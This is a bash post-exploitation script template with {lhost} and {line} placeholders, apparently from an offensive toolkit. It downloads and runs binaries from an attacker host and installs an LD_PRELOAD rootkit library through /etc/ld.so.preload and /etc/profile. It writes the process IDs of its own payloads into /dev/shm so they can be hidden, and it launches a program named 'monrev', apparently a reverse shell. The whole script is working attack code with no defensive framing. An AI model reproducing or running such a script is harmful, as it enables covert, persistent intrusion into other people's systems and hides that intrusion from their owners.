#!/bin/bash
curl -o {line} http://{lhost}/{line}
curl -o {line}_service.sh http://{lhost}/{line}_service.sh 
curl -o {line}_service.sh http://{lhost}/l_{line}_service.sh
curl -o l_{line} http://{lhost}/l_{line} 
curl -o monrev http://{lhost}/monrev 
curl -o mrhyde.so http://{lhost}/mrhyde.so 
chmod +x {line} 
chmod +x {line}_service.sh 
chmod +x l_{line} 
chmod +x monrev 
cp mrhyde.so /home/.grisun0/
#echo "/home/.grisun0/payload.sh" | tee -a /etc/profile
$2='$2'
echo "ps aux | grep -Ei '(.*{lhost}.*|.*{line}.*|.*{line}.*|.*monrev.*|l_{line}.*|.*{line}_service\\.sh.*)' | awk '{print $2}' | xargs -I {} echo \"\\\"{}\\\",\" >> /dev/shm/pid" | tee -a /etc/profile
touch /dev/shm/file
./{line}_service.sh &
nohup ./{line} &
nohup ./l_{line} &
#echo "[*] Pids to hide:"
ps aux | grep -Ei '(.*{lhost}.*|.*grisun0.*|.*{line}.*|.*monrev.*|l_{line}.*|.*{line}_service\.sh.*)' | awk '{print $2}' | xargs -I {} echo "\"{}\"," >> /dev/shm/pid
chown grisun0:grisun0 /home/.grisun0/ -R 
echo 'export LD_PRELOAD=/home/.grisun0/mrhyde.so' | tee -a /etc/profile
export LD_PRELOAD=/home/.grisun0/mrhyde.so 
echo "/home/.grisun0/mrhyde.so" | tee -a /etc/ld.so.preload
bash -c 'echo "export LD_PRELOAD=/home/.grisun0/mrhyde.so" > /etc/profile.d/ld_preload.sh'
./monrev